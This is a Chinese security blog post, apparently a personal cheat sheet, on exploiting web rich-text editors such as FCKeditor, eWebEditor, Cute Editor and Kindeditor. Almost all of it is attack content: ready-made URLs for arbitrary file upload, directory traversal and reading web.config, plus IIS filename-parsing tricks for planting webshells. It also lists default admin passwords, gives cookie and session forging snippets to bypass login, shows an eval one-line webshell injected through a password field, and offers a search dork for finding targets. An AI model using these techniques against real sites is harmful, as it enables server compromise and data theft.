<!DOCTYPE html>
<!--[if lte IE 8 ]>
<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--
***************  *      *     *
      8          *    *       *
      8          *  *         *
      8          **           *
      8          *  *         *
      8          *    *       *
      8          *      *     *
      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<!--<![endif]-->

<head>
  <title>编辑器漏洞 | 大棟哥の博客</title>
  <!-- Meta data -->
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="大棟哥の博客">
    <meta name="author" content="JD">
    <meta name="description" content="" />
    <meta name="keywords" content="" />

    <!-- Favicon, (keep icon in root folder) -->
    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">

    <link rel="alternate" href="/atom.xml" title="大棟哥の博客" type="application/atom+xml">
    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
	
    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
    
    

    <!-- Custom stylesheet, (add custom styles here, always load last) -->
    <!-- Load our stylesheet for IE8 -->
    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
    <![endif]-->

    <!-- Google Webfonts (Monserrat 400/700, Open Sans 400/600) -->
    <link href='//fonts.useso.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>
    <link href='//fonts.useso.com/css?family=Open+Sans:400,600' rel='stylesheet' type='text/css'>

    <!-- Load our fonts individually if IE8+, to avoid faux bold & italic rendering -->
    <!--[if IE]>
    <link href='http://fonts.useso.com/css?family=Montserrat:400' rel='stylesheet' type='text/css'>
    <link href='http://fonts.useso.com/css?family=Montserrat:700' rel='stylesheet' type='text/css'>
    <link href='http://fonts.useso.com/css?family=Open+Sans:400' rel='stylesheet' type='text/css'>
    <link href='http://fonts.useso.com/css?family=Open+Sans:600' rel='stylesheet' type='text/css'>
    <![endif]-->

    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>

    <!-- Load these in the <head> for quicker IE8+ load times -->
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="/js/html5shiv.min.js"></script>
    <script src="/js/respond.min.js"></script>
    <![endif]-->










  
  
  

  
  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
</head>

<!--
<body class="post-template">
-->
<body id="index" class="lightnav animsition">

      <!-- ============================ Off-canvas navigation =========================== -->

    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
            <img src="/img/close.png" alt="Close"/>
        </div>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu">
            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
            <!-- Dropdown Menu -->
			 
            <li>
                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                        <li><a href="http://wy.hxsec.com/" target="_BLANK" class="animsition-link">WooYun</a></li>
                    
                        <li><a href="http://www.freebuf.com/" target="_BLANK" class="animsition-link">FreeBuf</a></li>
                    
                </ul>
            </li>
            
            
        	<li>
        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
            	<ul class="sb-submenu">
				  	
				    <li><a href="/categories/Linux/" class="animsition-link">Linux<small>(10)</small></a></li>
				    
				    <li><a href="/categories/PHP/" class="animsition-link">PHP<small>(4)</small></a></li>
				    
				    <li><a href="/categories/SQL-INJECTION/" class="animsition-link">SQL INJECTION<small>(11)</small></a></li>
				    
				    <li><a href="/categories/TCP-IP/" class="animsition-link">TCP/IP<small>(2)</small></a></li>
				    
				    <li><a href="/categories/Talks/" class="animsition-link">Talks<small>(2)</small></a></li>
				    
				    <li><a href="/categories/WEB/" class="animsition-link">WEB<small>(12)</small></a></li>
				    
				    <li><a href="/categories/collect-message/" class="animsition-link">collect message<small>(1)</small></a></li>
				    
				    <li><a href="/categories/life/" class="animsition-link">life<small>(1)</small></a></li>
				    
				    <li><a href="/categories/python/" class="animsition-link">python<small>(1)</small></a></li>
				    
				    <li><a href="/categories/read/" class="animsition-link">read<small>(3)</small></a></li>
				    
				    <li><a href="/categories/中间件/" class="animsition-link">中间件<small>(3)</small></a></li>
				    
				    <li><a href="/categories/代码审计/" class="animsition-link">代码审计<small>(1)</small></a></li>
				    
				    <li><a href="/categories/提权/" class="animsition-link">提权<small>(2)</small></a></li>
				    
				</ul>
        	</li>
			
            
        </ul>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu secondary">
            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
        </ul>
    </div>
    
    <!-- ============================ END Off-canvas navigation =========================== -->

    <!-- ============================ #sb-site Main Page Wrapper =========================== -->

    <div id="sb-site">
        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->

        <!-- ============================ Header & Logo bar =========================== -->

        <div id="navigation" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <!-- Nav logo -->
                    <div class="logo">
                        <a href="/" title="Logo" class="animsition-link">
                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
                        </a>
                    </div>
                    <!-- // Nav logo -->
                    <!-- Info-bar -->
                    <nav>
                        <ul class="nav">
                            <li><a href="/" class="animsition-link">大棟哥の博客</a></li>
                            <li class="nolink"><span>Always </span>Creative.</li>
                            
                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
                            
                            
                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
                            
                            
                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
                            
                            
                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
                            
                            
                            <li><a href="http://weibo.com/3908422305/profile?topnav=1&wvr=6&is_all=1" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
                            
                            <li class="nolink"><span>Welcome!</span></li>
                        </ul>
                    </nav>
                    <!--// Info-bar -->
                </div>
                <!-- // .container -->
                <div class="learnmore sb-toggle-right">More</div>
                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar before"></span>
                <span class="icon-bar main"></span>
                <span class="icon-bar after"></span>
                </button>
            </div>
            <!-- // .navbar-inner -->
        </div>

        <!-- ============================ Header & Logo bar =========================== -->

        <!-- ============================ Hero Image =========================== -->

        <section id="hero" class="scrollme">
            <div class="container-fluid element-img" style="background: url(/img/1.jpg) no-repeat center center fixed;background-size: cover">
                <div class="row">
                    <div class="col-xs-12 col-sm-8 col-sm-offset-2 col-md-8 col-md-offset-2 vertical-align cover boost text-center">
                        <div class="center-me animateme" data-when="exit" data-from="0" data-to="0.6" data-opacity="0" data-translatey="100">
                            <div>
                            	
                                <h2>THE QUITER YOU BECOME,THE <span>MORE</span> YOU ARE ABLE TO HEAR.<br/></h2>
                                <p></p>
				    			
                                <h2></h2>
                                <p><center>灵魂摆渡</center></p>
				    			

                            </div>
                        </div>
                    </div>
                    <!-- // .col-md-12 -->
                </div>
                <div class="herofade beige-dk"></div>
            </div>
        </section>

        <!-- Height spacing helper -->
        <div class="heightblock"></div>
        <!-- // End height spacing helper -->

        <!-- ============================ END Hero Image =========================== -->
      
<section id="intro">
    <div class="container">
        <div class="row col-md-offset-2">
            <div class="col-md-8">
    			<span class="post-meta">
      <time datetime="2017-02-27T15:38:39.000Z" itemprop="datePublished">
          2017-02-27
      </time>
    
    
    | 
    <a href='/tags/编辑器漏洞/'>编辑器漏洞</a>
    
    
</span>
                <h1>编辑器漏洞</h1>
            </div>
        </div>
        <div class="col-md-8 col-md-offset-2">
      		<h2 id="FCKeditorFCKeditor"><a href="#FCKeditorFCKeditor" class="headerlink" title="FCKeditorFCKeditor"></a>FCKeditorFCKeditor</h2><p>编辑器页FCKeditor/_samples/default.html<br>FCKeditor/_samples/default.html<br>FCKeditor/_samples/asp/sample01.asp<br>FCKeditor/_samples/asp/sample02.asp<br>FCKeditor/_samples/asp/sample03.asp<br>FCKeditor/_samples/asp/sample04.asp<br>fckeditor/editor/filemanager/connectors/test.html<br>FCKeditor 查看编辑器版本FCKeditor/_whatsnew.html<br>FCKeditor V2.43 版本<br>FCKeditor/editor/filemanager/browser/default/connectors/php/config.php<br>FCKeditor V2.6.6版本<br>FCKeditor/editor/filemanager/connectors/asp/config.php</p>
<h3 id="FCKeditor-匿名上传文件"><a href="#FCKeditor-匿名上传文件" class="headerlink" title="FCKeditor 匿名上传文件"></a>FCKeditor 匿名上传文件</h3><p>影响版本:非优化/精简版本的FCKeditor<br>脆弱描述：<br>如果存在以下文件，打开后即可上传文件。<br>攻击利用:<br>FCKeditor/editor/filemanager/upload/test.html<br>FCKeditor/editor/filemanager/browser/default/connectors/test.html<br>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector<br>FCKeditor/editor/filemanager/connectors/test.html<br>FCKeditor/editor/filemanager/connectors/uploadtest.html<br>FCKeditor 查看文件上传路径FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/<br>XML页面中第二行 url=/xxx的部分就是默认基准上传路径<br>Note:<br>[Hell1]截至2010年02月15日最新版本为FCKeditor v2.6.6<br>[Hell2]记得修改其中两处asp为FCKeditor实际使用的脚本语言<br>FCKeditor被动限制策略所导致的过滤不严问题影响版本: FCKeditor x.x &lt;= FCKeditor v2.4.3<br>脆弱描述：<br>FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|<br>pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm<br>Fckeditor 2.0 &lt;= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件<br>上传后 它保存的文件直接用的$sFilePath = $sServerDir . $sFileName，而没有使用$sExtension为后缀。直接导致在win下在上传文件后面加个.来突破[未测试]。而在apache下，因为”Apache文件名解析缺陷漏洞”也可以利用之，详见”附录A”<br>另建议其他上传漏洞中定义TYPE变量时使用File类别来上传文件,根据FCKeditor的代码，其限制最为狭隘。<br>攻击利用:<br>允许其他任何后缀上传</p>
<h3 id="利用2003路径解析漏洞上传木马"><a href="#利用2003路径解析漏洞上传木马" class="headerlink" title="利用2003路径解析漏洞上传木马"></a>利用2003路径解析漏洞上传木马</h3><p>影响版本: 附录B<br>脆弱描述：<br>利用2003系统路径解析漏洞的原理，创建类似bin.asp如此一般的目录，再在此目录中上传文件即可被脚本解释器以相应脚本权限执行。<br>攻击利用:<br>fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp<br>强制建立shell.asp目录：<br>FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684<br>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp<br>Note:[｀Sn4k3!]这个我也不知道咯，有些时候，手动不行，代码就是能成功，囧。<br>FCKeditor PHP上传任意文件漏洞影响版本: FCKeditor 2.2 &lt;= FCKeditor 2.4.2<br>脆弱描述：<br>FCKeditor在处理文件上传时存在输入验证错误，远程攻击可以利用此漏洞上传任意文件。<br>在通过editor/filemanager/upload/php/upload.php上传文件时攻击者可以通过为Type参数定义无效的值导致上传任意脚本。<br>成功攻击要求config.php配置文件中启用文件上传，而默认是禁用的。攻击利用: (请修改action字段为指定网址)：<br>        <figure class="highlight plain"><figcaption><span>cid="frmUpload" enctype="multipart/form-data"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action=&quot;http://xxxxx.it/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;</span><br><span class="line">&lt;input cid=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p>
<p>Note:如想尝试v2.2版漏洞，则修改Type=任意值 即可，但注意，如果换回使用Media则必须大写首字母M,否则LINUX下，FCKeditor会对文件目录进行文件名校验，不会上传成功的。</p>
<h3 id="FCKeditor-暴路径漏洞影响版本："><a href="#FCKeditor-暴路径漏洞影响版本：" class="headerlink" title="FCKeditor 暴路径漏洞影响版本："></a>FCKeditor 暴路径漏洞影响版本：</h3><p>aspx版FCKeditor<br>攻击利用：<br>FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/1.asp<br>FCKeditor 文件上传“.”变“_”下划线的绕过方法影响版本: FCKeditor =&gt; 2.4.x<br>脆弱描述：<br>我们上传的文件例如：shell.php.rar或shell.php;.jpg会变为shell_php;.jpg这是新版FCK的变化。<br>攻击利用:<br>提交1.php+空格 就可以绕过去所有的,<br>※不过空格只支持win系统 *nix是不支持的[1.php和1.php+空格是2个不同的文件]<br>Note:<a href="http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html" target="_blank" rel="external">http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html</a></p>
<h3 id="FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）"><a href="#FCKeditor-文件上传“-”变“-”下划线的绕过方法（二）" class="headerlink" title="FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）"></a>FCKeditor 文件上传“.”变“_”下划线的绕过方法（二）</h3><p>影响版本:=&gt;2.4.x的最新版已修补<br>脆弱描述:<br>来源:T00LS.Net<br>由于Fckeditor对第一次上传123.asp;123.jpg 这样的格式做了过滤。也就是IIS6解析漏洞。<br>上传第一次。被过滤为123_asp;123.jpg 从而无法运行。<br>但是第2次上传同名文件123.asp;123.jpg后。由于”123_asp;123.jpg”已经存在。<br>文件名被命名为123.asp;123(1).jpg …… 123.asp;123(2).jpg这样的编号方式。<br>所以。IIS6的漏洞继续执行了。<br>如果通过上面的步骤进行测试没有成功，可能有以下几方面的原因：<br>1.FCKeditor没有开启文件上传功能，这项功能在安装FCKeditor时默认是关闭的。如果想上传文件，FCKeditor会给出错误提示。<br>2.网站采用了精简版的FCKeditor，精简版的FCKeditor很多功能丢失，包括文件上传功能。<br>3.FCKeditor的这个漏洞已经被修复。</p>
<h3 id="FCKeditor-新闻组件遍历目录漏洞影响版本-Aspx与JSP版FCKeditor"><a href="#FCKeditor-新闻组件遍历目录漏洞影响版本-Aspx与JSP版FCKeditor" class="headerlink" title="FCKeditor 新闻组件遍历目录漏洞影响版本:Aspx与JSP版FCKeditor"></a>FCKeditor 新闻组件遍历目录漏洞影响版本:Aspx与JSP版FCKeditor</h3><p>脆弱描述：如何获得webshell请参考上文“TYPE自定义变量任意上传文件漏洞”<br>攻击利用:<br>修改CurrentFolder参数使用 ../../来进入不同的目录<br>/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=aspx.asp<br>根据返回的XML信息可以查看网站所有的目录。<br>/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F</p>
<p>/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F</p>
<h3 id="TYPE自定义变量任意上传文件漏洞"><a href="#TYPE自定义变量任意上传文件漏洞" class="headerlink" title="TYPE自定义变量任意上传文件漏洞"></a>TYPE自定义变量任意上传文件漏洞</h3><p>影响版本: 较早版本<br>脆弱描述：<br>通过自定义Type变量的参数，可以创建或上传文件到指定的目录中去，且没有上传文件格式的限制。<br>攻击利用:<br>/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp<br>打开这个地址就可以上传任何类型的文件了，Shell上传到的默认位置是:<br><a href="http://navisec.it/UserFiles/all/1.asp" target="_blank" rel="external">http://navisec.it/UserFiles/all/1.asp</a><br>Type=all 这个变量是自定义的,在这里创建了all这个目录,而且新的目录没有上传文件格式的限制.<br>比如输入:<br>    /FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&amp;Connector=connectors/asp/connector.asp<br>网马就可以传到网站的根目录下.<br>Note:如找不到默认上传文件夹可检查此文件:<br>    fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/ </p>
<h2 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h2><h3 id="eWebEditor-基础知识"><a href="#eWebEditor-基础知识" class="headerlink" title="eWebEditor 基础知识"></a>eWebEditor 基础知识</h3><p>默认后台地址：<br>/ewebeditor/admin_login.asp<br>/WebEdior/admin/login.aspx<br>建议最好检测下admin_style.asp文件是否可以直接访问<br>默认数据库路径：<br>[PATH]/db/ewebeditor.mdb<br>[PATH]/db/db.mdb<br>[PATH]/db/%23ewebeditor.mdb<br>默认密码：<br>admin/admin888 、 admin/admin、 admin/123456 、admin/admin999<br>点击“样式管理”—可以选择新增样式，或者修改一个非系统样式，将其中图片控件所允许的上传类型后面加上|asp、|asa、|aaspsp或|cer，只要是服务器允许执行的脚本类型即可，点击“提交”并设置工具栏—将“插入图片”控件添加上。而后—预览此样式，点击插入图片，上传WEBSHELL，在“代码”模式中查看上传文件的路径。<br>2、当数据库被管理员修改为asp、asa后缀的时候，可以插一句话木马服务端进入数据库，然后一句话木马客户端连接拿下webshell<br>3、上传后无法执行？目录没权限？帅锅你回去样式管理看你编辑过的那个样式，里面可以自定义上传路径的！！！<br>4、设置好了上传类型，依然上传不了麽？估计是文件代码被改了，可以尝试设定“远程类型”依照6.0版本拿SHELL的方法来做（详情见下文↓），能够设定自动保存远程文件的类型。<br>5、不能添加工具栏，但设定好了某样式中的文件类型，怎么办？↓这么办！<br>(请修改action字段)<br>Action.html<br>6、需要突破上传文件类型限制么？Come here! —&gt;&gt; 将图片上传类型修改为“aaspsp;”(不含引号)，将一句话shell文件名改为“1.asp;”(不含引号)并上传即可。—&gt;本条信息来源：微笑刺客</p>
<h3 id="eWebEditor-可下载数据库，但密文解不开"><a href="#eWebEditor-可下载数据库，但密文解不开" class="headerlink" title="eWebEditor 可下载数据库，但密文解不开"></a>eWebEditor 可下载数据库，但密文解不开</h3><p>脆弱描述：<br>当我们下载数据库后查询不到密码MD5的明文时，可以去看看webeditor_style(14)这个样式表，看看是否有前辈入侵过 或许已经赋予了某控件上传脚本的能力，构造地址来上传我们自己的WEBSHELL.<br>攻击利用:<br>比如 ID=46 s-name =standard1<br>构造 代码: ewebeditor.asp?id=content&amp;style=standard<br>ID和和样式名改过后<br>ewebeditor.asp?id=46&amp;style=standard1</p>
<h3 id="eWebEditor遍历目录漏洞"><a href="#eWebEditor遍历目录漏洞" class="headerlink" title="eWebEditor遍历目录漏洞"></a>eWebEditor遍历目录漏洞</h3><p>脆弱描述：<br>ewebeditor/admin_uploadfile.asp<br>admin/upload.asp<br>过滤不严，造成遍历目录漏洞<br>攻击利用:<br>第一种:ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=<a href="http://navisec.it/../" target="_blank" rel="external">http://navisec.it/../</a>.. 看到整个网站文件了<br>第二种: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..</p>
<h3 id="eWebEditor-5-2-列目录漏洞"><a href="#eWebEditor-5-2-列目录漏洞" class="headerlink" title="eWebEditor 5.2 列目录漏洞"></a>eWebEditor 5.2 列目录漏洞</h3><p>脆弱描述：<br>ewebeditor/asp/browse.asp<br>过滤不严，造成遍历目录漏洞<br>攻击利用：<br><a href="http://navisec.it/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/" target="_blank" rel="external">http://navisec.it/ewebeditor/asp/browse.asp?style=standard650&amp;dir=…././/</a>..<br>利用eWebEditor session欺骗漏洞,进入后台脆弱描述：<br>漏洞文件:Admin_Private.asp<br>只判断了session，没有判断cookies和路径的验证问题。<br>攻击利用:<br>新建一个test.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问test.asp，再访问后台任何文件，for example:Admin_Default.asp</p>
<h3 id="eWebEditor-asp版-2-1-6-上传漏洞"><a href="#eWebEditor-asp版-2-1-6-上传漏洞" class="headerlink" title="eWebEditor asp版 2.1.6 上传漏洞"></a>eWebEditor asp版 2.1.6 上传漏洞</h3><p>攻击利用:（请修改action字段为指定网址）<br>ewebeditor asp版2.1.6上传漏洞利用程序.html</p>
<h3 id="eWebEditor-2-7-0-注入漏洞"><a href="#eWebEditor-2-7-0-注入漏洞" class="headerlink" title="eWebEditor 2.7.0 注入漏洞"></a>eWebEditor 2.7.0 注入漏洞</h3><p>攻击利用:<br><a href="http://navisec.it/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200" target="_blank" rel="external">http://navisec.it/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200</a><br>默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.</p>
<h3 id="eWebEditor2-8-0最终版删除任意文件漏洞"><a href="#eWebEditor2-8-0最终版删除任意文件漏洞" class="headerlink" title="eWebEditor2.8.0最终版删除任意文件漏洞"></a>eWebEditor2.8.0最终版删除任意文件漏洞</h3><p>脆弱描述：<br>此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。<br>攻击利用: (请修改action字段为指定网址)<br>Del Files.html</p>
<h3 id="eWebEditor-PHP-ASP-后台通杀漏洞"><a href="#eWebEditor-PHP-ASP-后台通杀漏洞" class="headerlink" title="eWebEditor PHP/ASP 后台通杀漏洞"></a>eWebEditor PHP/ASP 后台通杀漏洞</h3><p>影响版本: PHP ≥ 3.0~3.8与asp 2.8版也通用，或许低版本也可以，有待测试。<br>攻击利用:<br>进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.<br>这时候你清空浏览器的url,然后输入<br>javascript:alert(document.cookie=”adminuser=”+escape(“admin”));<br>javascript:alert(document.cookie=”adminpass=”+escape(“admin”));<br>javascript:alert(document.cookie=”admindj=”+escape(“1”));<br>而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。</p>
<h3 id="eWebEditor-for-php任意文件上传漏洞"><a href="#eWebEditor-for-php任意文件上传漏洞" class="headerlink" title="eWebEditor for php任意文件上传漏洞"></a>eWebEditor for php任意文件上传漏洞</h3><p>影响版本:ewebeditor php v3.8 or older version<br>脆弱描述:<br>此版本将所有的风格配置信息保存为一个数组$aStyle,在php.ini配置register_global为on的情况下我们可以任意添加自己喜欢的风格，并定义上传类型。<br>攻击利用:<br>phpupload.html</p>
<h3 id="eWebEditor-JSP版漏洞"><a href="#eWebEditor-JSP版漏洞" class="headerlink" title="eWebEditor JSP版漏洞"></a>eWebEditor JSP版漏洞</h3><p>大同小异，我在本文档不想多说了，因为没环境 测试，网上垃圾场那么大，不好排查。用JSP编辑器的我觉得eweb会比FCKeditor份额少得多。</p>
<h3 id="eWebEditor-2-8-商业版插一句话木马"><a href="#eWebEditor-2-8-商业版插一句话木马" class="headerlink" title="eWebEditor 2.8 商业版插一句话木马"></a>eWebEditor 2.8 商业版插一句话木马</h3><p>影响版本:=&gt;2.8 商业版<br>攻击利用:<br>登陆后台，点击修改密码—-新密码设置为 1”:eval request(“h”)’<br>设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.<br>注意：可能因为转载的关系，代码会变掉，最好本地调试好代码再提交。</p>
<h3 id="eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet"><a href="#eWebEditorNet-upload-aspx-上传漏洞-WebEditorNet" class="headerlink" title="eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)"></a>eWebEditorNet upload.aspx 上传漏洞(WebEditorNet)</h3><p>脆弱描述：<br>WebEditorNet 主要是一个upload.aspx文件存在上传漏洞。<br>攻击利用:<br>默认上传地址：/ewebeditornet/upload.aspx<br>可以直接上传一个cer的木马<br>如果不能上传则在浏览器地址栏中输入javascript:lbtnUpload.click();<br>成功以后查看源代码找到uploadsave查看上传保存地址，默认传到uploadfile这个文件夹里。</p>
<h2 id="southidceditor-一般使用v2-8-0版eWeb核心"><a href="#southidceditor-一般使用v2-8-0版eWeb核心" class="headerlink" title="southidceditor(一般使用v2.8.0版eWeb核心)"></a>southidceditor(一般使用v2.8.0版eWeb核心)</h2><pre><code>http://navisec.it/admin/southidceditor/datas/southidceditor.mdb
http://navisec.it/admin/southidceditor/admin/admin_login.asp
http://navisec.it/admin/southidceditor/popup.asp
</code></pre><p>bigcneditor(eWeb 2.7.5 VIP核心)<br>其实所谓的Bigcneditor就是eWebEditor 2.7.5的VIP用户版.之所以无法访问admin_login.asp，提示“权限不够”4字真言，估计就是因为其授权“Licensed”问题,或许只允许被授权的机器访问后台才对。<br>或许上面针对eWebEditor v2.8以下低版本的小动作可以用到这上面来.貌似没多少动作?</p>
<h2 id="Cute-Editor"><a href="#Cute-Editor" class="headerlink" title="Cute Editor"></a>Cute Editor</h2><h3 id="Cute-Editor在线编辑器本地包含漏洞"><a href="#Cute-Editor在线编辑器本地包含漏洞" class="headerlink" title="Cute Editor在线编辑器本地包含漏洞"></a>Cute Editor在线编辑器本地包含漏洞</h3><p>影响版本:<br>CuteEditor For Net 6.4<br>脆弱描述：<br>可以随意查看网站文件内容，危害较大。<br>攻击利用:<br><a href="http://navisec.it/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config" target="_blank" rel="external">http://navisec.it/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</a></p>
<h3 id="Cute-Editor-Asp-Net版利用iis解析漏洞获得权限"><a href="#Cute-Editor-Asp-Net版利用iis解析漏洞获得权限" class="headerlink" title="Cute Editor Asp.Net版利用iis解析漏洞获得权限"></a>Cute Editor Asp.Net版利用iis解析漏洞获得权限</h3><p>影响版本：<br>CuteEditor for ASP.NET中文版脆弱描述：<br>脆弱描述：<br>CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。<br>攻击利用：<br>可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。<br>在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</p>
<h2 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本：&lt;= Webhtmleditor最终版1.7 (已停止更新)<br>脆弱描述/攻击利用：<br>对上传的图片或其他文件无重命名操作，导致允许恶意用户上传diy.asp;.jpg来绕过对后缀名审查的限制，对于此类因编辑器作者意识犯下的错误，就算遭遇缩略图，文件头检测，也可使用图片木马 插入一句话来突破。</p>
<h2 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h2><h3 id="利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1"><a href="#利用WIN-2003-IIS文件名称解析漏洞获得SHELL-1" class="headerlink" title="利用WIN 2003 IIS文件名称解析漏洞获得SHELL"></a>利用WIN 2003 IIS文件名称解析漏洞获得SHELL</h3><p>影响版本: &lt;= kindeditor 3.2.1(09年8月份发布的最新版)<br>脆弱描述/攻击利用：<br>拿官方做个演示：进入<a href="http://navisec.it/ke/examples/index.html" target="_blank" rel="external">http://navisec.it/ke/examples/index.html</a> 随意点击一个demo后点图片上传，某君上传了如下文件：<a href="http://navisec.it/ke/attached/test.asp;.jpg" target="_blank" rel="external">http://navisec.it/ke/attached/test.asp;.jpg</a> 大家可以前去围观。(现已失效，请速至老琴房弹奏《Secret》回到09年8月份观看)<br>Note:参见附录C原理解析。</p>
